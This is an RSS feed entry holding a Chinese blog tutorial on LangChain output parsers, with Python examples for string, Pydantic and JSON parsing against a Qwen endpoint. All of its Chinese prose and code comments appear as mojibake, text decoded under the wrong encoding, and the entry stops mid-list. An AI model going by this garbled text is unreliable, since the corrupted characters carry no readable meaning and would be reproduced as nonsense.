<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[ã€LangChainå­¦ä¹ ç¬”è®°ã€‘è¾“å‡ºè§£æå™¨]]></title>    <link>https://juejin.cn/post/7588844115318685748</link>    <guid>https://juejin.cn/post/7588844115318685748</guid>    <pubDate>2025-12-29T07:17:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588844115318685748" data-draft-id="7589063105731035151" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€LangChainå­¦ä¹ ç¬”è®°ã€‘è¾“å‡ºè§£æå™¨"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T07:17:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æ³¥ç§è·èŠ±"/> <meta itemprop="url" content="https://juejin.cn/user/4212984289442030"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€LangChainå­¦ä¹ ç¬”è®°ã€‘è¾“å‡ºè§£æå™¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4212984289442030/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æ³¥ç§è·èŠ±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:17:30.000Z" title="Mon Dec 29 2025 07:17:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">æ ¸å¿ƒå®šä¹‰</h2>
<p>è¾“å‡ºè§£æå™¨æ˜¯ LangChain æ ¸å¿ƒç»„ä»¶ä¹‹ä¸€ï¼Œæ ¸å¿ƒä½œç”¨æœ‰ä¸‰ï¼š</p>
<ol>
<li>ä¸ºå¤§æ¨¡å‹æä¾›æ ‡å‡†åŒ–æ ¼å¼åŒ–æç¤ºè¯ï¼Œå¼•å¯¼æ¨¡å‹æŒ‰æŒ‡å®šæ ¼å¼è¾“å‡ºï¼›</li>
<li>æ ¡éªŒå¤§æ¨¡å‹è¾“å‡ºæ˜¯å¦ç¬¦åˆé¢„æœŸæ ¼å¼è¦æ±‚ï¼›</li>
<li>è§£æå¤§æ¨¡å‹è¾“å‡ºå†…å®¹ï¼Œè½¬æ¢ä¸ºå¯ç”¨æ ¼å¼ï¼ˆå­—ç¬¦ä¸²/ç»“æ„åŒ–å¯¹è±¡ç­‰ï¼‰ï¼›</li>
</ol>
<h2 data-id="heading-1">å¸¸ç”¨è¾“å‡ºè§£æå™¨åŠä½¿ç”¨</h2>
<h3 data-id="heading-2">StrOutputParserï¼ˆå­—ç¬¦ä¸²è§£æå™¨ï¼‰</h3>
<h4 data-id="heading-3">æ ¸å¿ƒä½œç”¨</h4>
<p>ç”¨äºæ¸…ç†å¤§æ¨¡å‹è¾“å‡ºå†…å®¹ï¼Œå»é™¤è¾“å‡ºå‰åçš„æ¢è¡Œç¬¦ï¼ˆ<code>\n</code>ï¼‰ï¼Œä»…ä¿ç•™çº¯æ–‡æœ¬æ ¸å¿ƒè¾“å‡ºï¼Œè¿”å›æ ‡å‡†å­—ç¬¦ä¸²æ ¼å¼ã€‚</p>
<h4 data-id="heading-4">å®Œæ•´ä½¿ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI
<span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> PromptTemplate
<span class="hljs-keyword">from</span> langchain_core.output_parsers <span class="hljs-keyword">import</span> StrOutputParser

<span class="hljs-comment"># å¤§æ¨¡å‹åˆå§‹åŒ–ï¼ˆå‚æ•°é…ç½®è§ä¸“é¡¹ç¬”è®°ï¼‰</span>
llm = ChatOpenAI(
    <span class="hljs-comment"># æ¨¡å‹åç§°</span>
    model_name=<span class="hljs-string">"qwen-plus"</span>,
    <span class="hljs-comment"># æ¨¡å‹åŸºç¡€åœ°å€</span>
    base_url=<span class="hljs-string">"https://dashscope.aliyuncs.com/compatible-mode/v1"</span>,
    <span class="hljs-comment"># æ›¿æ¢ä¸ºä¸ªäººæœ‰æ•ˆAPI Key</span>
    api_key=<span class="hljs-string">"[ä½ çš„API Key]"</span>
)

<span class="hljs-comment"># å®šä¹‰æç¤ºæ¨¡æ¿</span>
prompt_template = PromptTemplate.from_template(<span class="hljs-string">"ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„æ•°å­¦åŠ©æ‰‹ï¼Œ{question}"</span>)

<span class="hljs-comment"># åˆå§‹åŒ–å­—ç¬¦ä¸²è§£æå™¨</span>
str_output_parser = StrOutputParser()

<span class="hljs-comment"># æ„å»ºé“¾å¼è°ƒç”¨</span>
chain = prompt_template | llm | str_output_parser

<span class="hljs-comment"># æ‰§è¡Œè°ƒç”¨</span>
response = chain.invoke(<span class="hljs-built_in">input</span>={<span class="hljs-string">"question"</span>: <span class="hljs-string">"è®¡ç®—10å’Œ20çš„å’Œ"</span>})

<span class="hljs-comment"># æ‰“å°è§£æåç»“æœ</span>
<span class="hljs-built_in">print</span>(response)
</code></pre>
<blockquote>
<p><strong>æç¤º</strong>ï¼š<code>StrOutputParser </code> ä¸å­˜åœ¨ <code>get_format_instructions</code> æ–¹æ³•ï¼Œæ— éœ€é…ç½®æ ¼å¼åŒ–æŒ‡ä»¤ã€‚</p>
</blockquote>
<h3 data-id="heading-5">PydanticOutputParserï¼ˆç»“æ„åŒ–å¯¹è±¡è§£æå™¨ï¼‰</h3>
<h4 data-id="heading-6">æ ¸å¿ƒä½œç”¨</h4>
<p>å°†å¤§æ¨¡å‹è¾“å‡ºè§£æä¸ºç¬¦åˆ Pydantic æ¨¡å‹å®šä¹‰çš„ç»“æ„åŒ–å¯¹è±¡ï¼Œä¾¿äºåç»­æ•°æ®æå–ä¸æ ¡éªŒï¼Œè¿”å›å€¼ä¸º Pydantic æ¨¡å‹å®ä¾‹å¯¹è±¡ã€‚</p>
<h4 data-id="heading-7">å…³é”®æ–¹æ³•</h4>
<p><code>get_format_instructions()</code>ï¼šè·å– Pydantic æ¨¡å‹å¯¹åº”çš„æ ¼å¼åŒ–æŒ‡ä»¤ï¼Œç”¨äºä¼ é€’ç»™æç¤ºæ¨¡æ¿ï¼Œå¼•å¯¼å¤§æ¨¡å‹æŒ‰æ ¼å¼è¾“å‡ºã€‚</p>
<h4 data-id="heading-8">å®Œæ•´ä½¿ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_openai <span class="hljs-keyword">import</span> ChatOpenAI
<span class="hljs-keyword">from</span> langchain_core.prompts <span class="hljs-keyword">import</span> PromptTemplate
<span class="hljs-keyword">from</span> langchain_core.output_parsers <span class="hljs-keyword">import</span> PydanticOutputParser
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel, Field

<span class="hljs-comment"># å¤§æ¨¡å‹åˆå§‹åŒ–ï¼ˆå‚æ•°é…ç½®è§ä¸“é¡¹ç¬”è®°ï¼‰</span>
llm = ChatOpenAI(
    <span class="hljs-comment"># æ¨¡å‹åç§°</span>
    model_name=<span class="hljs-string">"qwen-plus"</span>,
    <span class="hljs-comment"># æ¨¡å‹åŸºç¡€åœ°å€</span>
    base_url=<span class="hljs-string">"https://dashscope.aliyuncs.com/compatible-mode/v1"</span>,
    <span class="hljs-comment"># æ›¿æ¢ä¸ºä¸ªäººæœ‰æ•ˆAPI Key</span>
    api_key=<span class="hljs-string">"[ä½ çš„API Key]"</span>
)

<span class="hljs-comment"># å®šä¹‰Pydanticæ•°æ®æ¨¡å‹</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SumArgs</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    <span class="hljs-comment"># ç¬¬ä¸€ä¸ªæ•°ï¼ˆæ•´æ•°ç±»å‹ï¼‰</span>
    num1: <span class="hljs-built_in">int</span> = Field(description=<span class="hljs-string">"ç¬¬ä¸€ä¸ªæ•°"</span>)
    <span class="hljs-comment"># ç¬¬äºŒä¸ªæ•°ï¼ˆæ•´æ•°ç±»å‹ï¼‰</span>
    num2: <span class="hljs-built_in">int</span> = Field(description=<span class="hljs-string">"ç¬¬äºŒä¸ªæ•°"</span>)
    <span class="hljs-comment"># ä¸¤ä¸ªæ•°çš„å’Œï¼ˆæ•´æ•°ç±»å‹ï¼‰</span>
    <span class="hljs-built_in">sum</span>: <span class="hljs-built_in">int</span> = Field(description=<span class="hljs-string">"ä¸¤ä¸ªæ•°çš„å’Œ"</span>)

<span class="hljs-comment"># åˆå§‹åŒ–Pydanticè¾“å‡ºè§£æå™¨</span>
pydantic_output_parser = PydanticOutputParser(pydantic_object=SumArgs)

<span class="hljs-comment"># å®šä¹‰æç¤ºæ¨¡æ¿</span>
prompt_template = PromptTemplate.from_template(
    <span class="hljs-string">"""
    ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„æ•°å­¦åŠ©æ‰‹
    é—®é¢˜å†…å®¹ï¼š{question}
    è¾“å‡ºæ ¼å¼ï¼š{format_instructions}
    """</span>
)

<span class="hljs-comment"># é¢„å¡«å……æ ¼å¼åŒ–æŒ‡ä»¤</span>
prompt_template = prompt_template.partial(
    format_instructions=pydantic_output_parser.get_format_instructions()
)

<span class="hljs-comment"># æ„å»ºé“¾å¼è°ƒç”¨</span>
chain = prompt_template | llm | pydantic_output_parser

<span class="hljs-comment"># æ‰§è¡Œè°ƒç”¨</span>
response = chain.invoke(<span class="hljs-built_in">input</span>={<span class="hljs-string">"question"</span>: <span class="hljs-string">"è®¡ç®—10å’Œ20çš„å’Œ"</span>})

<span class="hljs-comment"># æ‰“å°è§£æåç»“æœï¼ˆPydanticå®ä¾‹å¯¹è±¡ï¼‰</span>
<span class="hljs-built_in">print</span>(response)
</code></pre>
<h3 data-id="heading-9">3. JsonOutputParserï¼ˆJSONæ ¼å¼è§£æå™¨ï¼‰</h3>
<h4 data-id="heading-10">æ ¸å¿ƒä½œç”¨</h4>
<p>å°†å¤§æ¨¡å‹è¾“å‡ºè§£æä¸ºæ ‡å‡† JSON æ ¼å¼ï¼Œä½¿ç”¨æ–¹å¼ä¸ <code>PydanticOutputParser</code> ç±»ä¼¼ï¼Œæ ¸å¿ƒåŒºåˆ«åœ¨äºè§£æåçš„è¾“å‡ºæ ¼å¼ä¸º JSON å­—ç¬¦ä¸²/å¯¹è±¡ã€‚</p>
<h4 data-id="heading-11">å…³é”®æ–¹æ³•</h4>
<p><code>get_format_instructions()</code>ï¼šè·å– JSON æ ¼å¼çš„æ ‡å‡†åŒ–æŒ‡ä»¤ï¼Œè¿”å›å­—ç¬¦ä¸²ç±»å‹ï¼Œç”¨äºå¼•å¯¼å¤§æ¨¡å‹è¾“å‡ºåˆè§„ JSON å†…å®¹ã€‚</p>
<h5 data-id="heading-12">å®Œæ•´ä½¿ç”¨ç¤ºä¾‹</h5>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.output_parsers <span class="hljs-keyword">import</span> JsonOutputParser
<span class="hljs-keyword">from</span> pydantic <span class="hljs-keyword">import</span> BaseModel, Field

<span class="hljs-comment"># å®šä¹‰Pydanticæ•°æ®æ¨¡å‹ï¼ˆçº¦æŸJSONå­—æ®µï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SumArgs</span>(<span class="hljs-title class_ inherited__">BaseModel</span>):
    <span class="hljs-comment"># ç¬¬ä¸€ä¸ªæ•°ï¼ˆæ•´æ•°ç±»å‹ï¼‰</span>
    num1: <span class="hljs-built_in">int</span> = Field(description=<span class="hljs-string">"ç¬¬ä¸€ä¸ªæ•°"</span>)
    <span class="hljs-comment"># ç¬¬äºŒä¸ªæ•°ï¼ˆæ•´æ•°ç±»å‹ï¼‰</span>
    num2: <span class="hljs-built_in">int</span> = Field(description=<span class="hljs-string">"ç¬¬äºŒä¸ªæ•°"</span>)
    <span class="hljs-comment"># ä¸¤ä¸ªæ•°çš„å’Œï¼ˆæ•´æ•°ç±»å‹ï¼‰</span>
    <span class="hljs-built_in">sum</span>: <span class="hljs-built_in">int</span> = Field(description=<span class="hljs-string">"ä¸¤ä¸ªæ•°çš„å’Œ"</span>)

<span class="hljs-comment"># åˆå§‹åŒ–JSONè¾“å‡ºè§£æå™¨</span>
json_output_parser = JsonOutputParser(pydantic_object=SumArgs)

<span class="hljs-comment"># å®šä¹‰æç¤ºæ¨¡æ¿</span>
prompt_template = PromptTemplate.from_template(
    <span class="hljs-string">"""
    ä½ æ˜¯ä¸€ä¸ªä¸“ä¸šçš„æ•°å­¦åŠ©æ‰‹
    é—®é¢˜å†…å®¹ï¼š{question}
    è¾“å‡ºæ ¼å¼ï¼š{format_instructions}
    """</span>
)

<span class="hljs-comment"># é¢„å¡«å……æ ¼å¼åŒ–æŒ‡ä»¤</span>
prompt_template = prompt_template.partial(
    format_instructions=json_output_parser.get_format_instructions()
)

<span class="hljs-comment"># æ„å»ºé“¾å¼è°ƒç”¨</span>
chain = prompt_template | llm | json_output_parser

<span class="hljs-comment"># æ‰§è¡Œè°ƒç”¨</span>
response = chain.invoke(<span class="hljs-built_in">input</span>={<span class="hljs-string">"question"</span>: <span class="hljs-string">"è®¡ç®—10å’Œ20çš„å’Œ"</span>})

<span class="hljs-comment"># æ‰“å°è§£æåç»“æœ</span>
<span class="hljs-built_in">print</span>(response)
</code></pre>
<h2 data-id="heading-13">æ ¸å¿ƒå…³é”®è¦ç‚¹</h2>
<ol>
<li>
<p><strong>é€šç”¨æµç¨‹</strong>ï¼šæ‰€æœ‰è¾“å‡ºè§£æå™¨çš„æ ¸å¿ƒä½¿ç”¨æµç¨‹ä¸€è‡´ï¼šå®šä¹‰æç¤ºæ¨¡æ¿ â†’ åˆå§‹åŒ–è§£æå™¨ â†’ é¢„å¡«å……æ ¼å¼åŒ–æŒ‡ä»¤ â†’ æ„å»ºé“¾å¼è°ƒç”¨ â†’ æ‰§è¡Œå¹¶è§£æç»“æœï¼›</p>
</li>
<li>
<p><strong>æ ¼å¼åŒ–æŒ‡ä»¤</strong>ï¼š<code>get_format_instructions()</code> æ˜¯æ ¸å¿ƒæ–¹æ³•ï¼Œç”¨äºå¼•å¯¼å¤§æ¨¡å‹æŒ‰é¢„æœŸæ ¼å¼è¾“å‡ºï¼Œç¼ºå¤±ä¼šå¯¼è‡´è§£æå¤±è´¥ï¼›</p>
</li>
<li>
<p><strong>è¿”å›ç±»å‹å·®å¼‚</strong>ï¼š</p>
<ul>
<li><code>StrOutputParser</code>ï¼šè¿”å›çº¯å­—ç¬¦ä¸²ï¼›</li>
